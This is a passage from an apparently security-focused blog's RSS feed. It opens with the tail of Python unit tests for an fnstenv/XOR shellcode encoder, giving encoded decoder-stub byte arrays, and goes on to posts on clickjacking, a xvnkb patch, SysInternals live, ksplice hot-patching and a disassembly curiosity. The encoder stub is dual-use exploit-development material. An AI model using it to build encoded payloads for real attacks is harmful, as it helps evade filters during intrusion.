    self.assertEqual(ret, [0xd9, 0xe1, 0xd9, 0x34, 0x24, 0x58, 0x58, 0x58,
                           0x58, 0x80, 0xe8, 0xe7, 0x31, 0xc9, 0x66, 0x81,
                           0xe9, 0xFF, 0xFF, 0x80, 0x30, 0x01, 0x40, 0xe2,
                           0xfa, 0x01])
    ret = encoder.encode("x00", ['ebx'])
    self.assertEqual(ret, [0xd9, 0xe1, 0xd9, 0x34, 0x24, 0x5b, 0x5b, 0x5b,
                           0x5b, 0x80, 0xeb, 0xe7, 0x31, 0xc9, 0x66, 0x81,
                           0xe9, 0xFF, 0xFF, 0x80, 0x33, 0x01, 0x43, 0xe2,
                           0xfa, 0x01])
    self.assertRaises(KeyError, encoder.encode, "x00", ['regset'])

def testDisallowedCharsInHeader(self):
    encoder = FnstenvXorEncoder(range(256))
    self.assertRaises(EncoderError, encoder.encode, "x7F")
    encoder = FnstenvXorEncoder([0xE1])
    self.assertRaises(EncoderError, encoder.encode, "x00")
    encoder = FnstenvXorEncoder([0x00, 0x01, 0x02])
    ret = encoder.encode("x00", ['edx'])
    self.assertEqual(ret, [0xd9, 0xe1, 0xd9, 0x34, 0x24, 0x5a, 0x5a, 0x5a,
                           0x5a, 0x80, 0xea, 0xe7, 0x31, 0xc9, 0x66, 0x81,
                           0xe9, 0xFF, 0xFF, 0x80, 0x32, 0x03, 0x42, 0xe2,
                           0xfa, 0x03])

def testDisallowedCharsInPayload(self):
    encoder = FnstenvXorEncoder([0x00, 0x01, 0x02])
    ret = encoder.encode("x03", ['edx'])
    self.assertEqual(ret, [0xd9, 0xe1, 0xd9, 0x34, 0x24, 0x5a, 0x5a, 0x5a,
                           0x5a, 0x80, 0xea, 0xe7, 0x31, 0xc9, 0x66, 0x81,
                           0xe9, 0xFF, 0xFF, 0x80, 0x32, 0x04, 0x42, 0xe2,
                           0xfa, 0x07])
    encoder = FnstenvXorEncoder([0x00, 0x01, 0x02, 0x04])
    ret = encoder.encode("x03", ['edx'])
    self.assertEqual(ret, [0xd9, 0xe1, 0xd9, 0x34, 0x24, 0x5a, 0x5a, 0x5a,
                           0x5a, 0x80, 0xea, 0xe7, 0x31, 0xc9, 0x66, 0x81,
                           0xe9, 0xFF, 0xFF, 0x80, 0x32, 0x05, 0x42, 0xe2,
                           0xfa, 0x06])
</code></pre>

<p>if <strong>name</strong> == “<strong>main</strong>”:
    unittest.main()
&lt;/pre&gt;</p>
<p>`
</p>

  ]]></description>
</item>

	<item>
  <title>Clickjacking revealed</title>
  <link>http://realjenius.com/tutorials/2008/10/27/clickjacking-revealed.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2008-10-27T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/tutorials/2008/10/27/clickjacking-revealed.html</guid>
  <description><![CDATA[
     <p>I just came back from the first day of OWASP AppSec Asia 2008 in Taipei. Beside two t-shirts, I got to be among the first privilege group to preview Robert Hansen’s presentation on Clickjacking. The show is scheduled for the second day, tomorrow, but I have to fly to Kuala Lumpur. How lucky am I!</p>

<p>Getting back to the issue, clickjacking basically borrows the user’s mouse click to click on another unintended object such as a link, or a button. For example, the website shows you a link, you click on it thinking that you will be taken to the intended location. But hey, the browser sends a request to another location!</p>

<p>But that’s doable with plain JavaScript too. What’s new here is the click you made could be placed on a button of an ActiveX. Scary, no? The demo showed me that, with clickjacking, bad guys could force Flash player to turn on the microphone. When you visit a HTML page, some JavaScript activates a Flash component. This component asks the Flash player to turn on the microphone and starts recording. Normally, Flash player will pop up a dialog with an OK button to ask for your permission before doing so. Now, your mouse click, that you made on the HTML page, is borrowed and used to click on that OK button. And Flash player turns on the microphone. Or maybe the webcam. Or, wait, maybe something more than that. Whatever you can do with a mouse click, clickjacking allows the attacker to “help” you do that, silently.</p>

<p>Thank you Robert for the preview. It was way cool!</p>

<p>For the HITB 2008 KL goers, Jeremiah Grossman will be presenting the keynote “The art of Click Jacking” on the first day. And I will see you there too.</p>

  ]]></description>
</item>

	<item>
  <title>xvnkb cvs patch</title>
  <link>http://realjenius.com/tutorials/2008/07/09/xvnkb-cvs-patch.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2008-07-09T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/tutorials/2008/07/09/xvnkb-cvs-patch.html</guid>
  <description><![CDATA[
     <p>Ngồi mân mê cái laptop thấy cpu bị switch khỏi idle mode rất nhiều. Ngó nghiêng một lúc thấy nguyên nhân là tại xvnkb nhà ta.  usleep(10000) được gọi liên tục trong main.c.</p>

<p>bản patch bonus thêm cái vụ crash với xscreensaver khi gõ password.</p>

<pre class="brush: diff; title: ; notranslate" title="">diff -r ./xvnkb_patch/main.c ./xvnkb_org/main.c

92d91
&lt; XEvent peekEvt;
94,95c93,94
&lt; //usleep(1000);
&lt; XPeekEvent(display, &amp;peekEvt);
---
&gt; usleep(1000);
&gt;
105c104
&lt; do {
---
&gt; while( XPending(display) ) {
110c109
&lt; } while( XPending(display) );
---
&gt; }

diff -r ./xvnkb_patch/xvnkb.c ./xvnkb_org/xvnkb.c
276,285c276
&lt;
&lt; /*
&lt; * CHANGES:
&lt; * - SEG FAULT report &amp; fixed by nm &lt;nm@vnoss.org&gt;
&lt; * problem occur when main app call XLookupString w/ keysym arg = NULL.
&lt; * (xscreensaver/lock.c :: size = XLookupString(event, s, 1, 0, compose_status) )
&lt; * pointer keysym must be validate before used.
&lt; */
&lt; if (keysym)
&lt; *keysym = vk_charset==VKC_UTF8 ? *pw|0x01000000 : (*(char *)buffer &amp; 0xFF);
---
&gt; *keysym = vk_charset==VKC_UTF8 ? *pw|0x01000000 : (*(char *)buffer &amp; 0xFF);
</pre>

  ]]></description>
</item>

	<item>
  <title>Sử dụng bộ công cụ SysInternals &quot;live&quot;</title>
  <link>http://realjenius.com/tutorials/2008/05/30/su-dung-bo-cong-cu-sysinternals-live.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2008-05-30T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/tutorials/2008/05/30/su-dung-bo-cong-cu-sysinternals-live.html</guid>
  <description><![CDATA[
     <p>Những nhà quản trị đã quá quen thuộc với bộ công cụ của SysInternals như Process Explorer, TcpView, Rootkit Revealer. Các công cụ này đã rất dễ được tải về và sử dụng, giờ đây lại càng dễ hơn nữa. Ví dụ như bạn có thể chạy ngay công cụ Process Explorer mới nhất bằng cách gõ dòng lệnh:</p>

<p><code>\live.sysinternals.comprocexp.exe</code></p>

<p>Quá đơn giản, phải không? Danh sách tất cả các công cụ có thể được xem tại <a href="http://live.sysinternals.com">http://live.sysinternals.com</a>.</p>

  ]]></description>
</item>

	<item>
  <title>Ksplice: &quot;vá&quot; nhân không cần khởi động lại</title>
  <link>http://realjenius.com/tutorials/2008/05/11/ksplice-va-nhan-khong-can-khoi-dong-lai.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2008-05-11T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/tutorials/2008/05/11/ksplice-va-nhan-khong-can-khoi-dong-lai.html</guid>
  <description><![CDATA[
     <p>The kernel developers are generally quite good about responding to security problems. Once a vulnerability in the kernel has been found, a patch comes out in short order; system administrators can then apply the patch (or get a patched kernel from their distributor), reboot the system, and get on with life knowing that the vulnerability has been fixed. It is a system which works pretty well. </p>

<p>One little problem remains, though: rebooting the system is a pain. At a minimum, it requires a few minutes of down time. In many situations, that down time cannot be tolerated. Reboots also disrupt any ongoing work, break existing network connections, and can cause the loss of results from long-running processes. And, most importantly of all, reboots prove traumatic for a certain subset of Linux administrators who prize a long uptime above almost all other things. Administrators currently have to choose between multi-year uptimes and security fixes; anything which frees them from a dilemma of this magnitude can only be welcome. </p>

<p>That “anything” might just be a recently-<a href="http://lwn.net/Articles/279378/">announced</a> project called <a href="http://web.mit.edu/ksplice/">ksplice</a>. With ksplice, system administrators can have the best of both worlds: security fixes without unsightly reboots. </p>

<p>An in-depth explanation of how ksplice works can be found in <a href="http://web.mit.edu/ksplice/doc/ksplice.pdf">this document [PDF]</a>. In short, ksplice requires as input the source tree for the running kernel and the security patch. It will then build two kernels, one with the patch and one without; the kernels are built with a special set of options which makes it easy to figure out which functions change as a result of the patch. The two kernels will be compared, with the purpose of finding those functions. Changes can propagate further than one might expect, especially if, for example, an inline function is modified. </p>

<p>Once a list of changed functions has been made, the updated code for those functions is packaged into a kernel module and loaded into the system. Then comes the tricky part: getting the running kernel to start using the new code. That requires patching the running code, which is a risky thing to do. Ksplice starts with a call to stop_machine_run(), which dumps a high-priority thread onto each processor, thus taking control of all processors in the system. It then examines all threads in the system to ensure that none of them are running in the functions to be replaced; if so, trampoline jumps are patched into the beginning of each replaced function (they “bounce” the call to the old code into the replacement code) and life continues. Otherwise ksplice will back off and try again later. </p>

<p>This method imposes a number of limitations. One is that only code changes can be patched in with ksplice; patches which make changes to data structures cannot be accommodated. Another comes from the retry-based approach to ensuring that no threads are running in the patched functions; what happens if one of those functions is never free? Kernel functions like schedule(), sys_poll(), or sys_waitid() are likely to always have processes running within them. In cases like this, ksplice will eventually give up and inform the user that the patch cannot be done; it is simply not possible to make changes to those particular functions. </p>

<p>These limitations mean that, out of 50 security patches examined by the ksplice developers, eight could not be applied with ksplice. So multi-year uptimes are probably still incompatible with the application of all security patches. Even so, ksplice certainly has the potential to reduce patch-related downtime considerably. Chances are good that there will be a fair amount of interest in ksplice in sites running high-uptime, mission-critical systems. </p>

<p>There are few things in the way of an immediate merge of this code into the mainline. One is a matter of coding quality and can be fixed. Then, there is the matter of the lead developer <a href="http://lwn.net/Articles/280064/">being unconvinced</a> that merging this code makes sense since it is, essentially, a standalone feature. Andi Kleen’s <a href="http://lwn.net/Articles/280065/">response</a> made the (usual) reasons for merging the code clear: &lt;/p&gt; </p>

<div class="BigQuote">
  To be honest you weren&#8217;t the first to come up with something like this (although you&#8217;re the first to post to l-k as far as I know). But the usual problem of something that is kept out of tree is that it eventually bitrots and gets forgotten. The only sane way to make such extensions a generically usable linux feature is to merge them to mainline.
</div>

<p>So, presumably, the code will eventually be proposed for a mainline merge. But there is one other little difficulty <a href="http://lwn.net/Articles/280066/">pointed out</a> by Tomasz Chmielewski: Microsoft holds <a href="http://www.google.com/patents?id=cVyWAAAAEBAJ&amp;dq=hotpatching">a patent</a> described this way: &lt;/p&gt; </p>

<div class="BigQuote">
  A system and method for automatically updating software components on a running computer system without requiring any interruption of service. A software module is hotpatched by loading a patch into memory and modifying an instruction in the original module to jump to the patch.
</div>

<p>Microsoft came up with this novel new technique in the distant past: 2002. The posting immediately brought out a crowd of surprised graybeards who distinctly remember using such techniques on their PDP-11 systems some decades before Microsoft “invented” hot-patching. The basic claim of the patent would thus appear to be invalidated by some decades’ worth of prior art, but some of the dependent claims include features (such as capturing all other processors on the system) which were unlikely to be useful on PDP-11s. </p>

<p>Given that the kernel developers are now well aware of this patent, they must take it into account when deciding whether to accept this code into the mainline. It would not be surprising if they chose to avoid baiting the Microsoft FUD machine in this way, even if they all agreed that the patent lacked validity. So a promising technology risks being left out of the kernel as the result of a software patent which was filed at least 30 years too late.</p>

<p>(Source: <a href="http://lwn.net/Articles/280058/">http://lwn.net/Articles/280058/</a>)</p>


  ]]></description>
</item>

	<item>
  <title>Fun code snippet</title>
  <link>http://realjenius.com/tutorials/2008/05/11/fun-code-snippet.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2008-05-11T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/tutorials/2008/05/11/fun-code-snippet.html</guid>
  <description><![CDATA[
     <p>This small snippet is copied from a much popular application.</p>

<p><code>.text:1000EBE0 push ecx ; some_string&lt;br /&gt;
.text:1000EBE1 push '%'&lt;br /&gt;
.text:1000EBE3 push '%'&lt;br /&gt;
.text:1000EBE5 push offset aCsystemdriveCS ; "%cSystemDrive%c%s"&lt;br /&gt;
.text:1000EBEA push edx ; buffer&lt;br /&gt;
.text:1000EBEB call ds:swprintf</code></p>

<p>Translated to C:</p>

<p><code>swprintf(buffer, "%cSystemDrive%c%s", '%', '%', some_string);</code></p>

<p>Of course you’d be scratching your head to explain why the writer wrote it this way, instead of simply <code>swprintf(buffer, "%%SystemDrive%%%s", some_string);</code>. To show off great C-kungfu? Or the lack thereof? Anyway, I just thought it was funny enough to post.</p>

  ]]></description>
</item>

</channel>
</rss>